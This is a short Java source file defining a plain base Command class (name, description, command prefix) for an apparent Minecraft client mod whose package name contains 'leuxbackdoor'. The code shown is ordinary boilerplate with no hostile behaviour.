package me.accessmodifier364.leuxbackdoor.client.command;


import me.accessmodifier364.leuxbackdoor.client.manager.CommandManager;
import net.minecraft.client.Minecraft;


public class Command {
	String name;
	String description;

	public Command(String name, String description) {
		this.name        = name;
		this.description = description;
	}

	public static final Minecraft mc = Minecraft.getMinecraft();

	public boolean get_message(String[] message) {
		return false;
	}

	public String get_name() {
		return this.name;
	}

	public String get_description() {
		return this.description;
	}

	public String current_prefix() {
		return CommandManager.get_prefix();
	}
}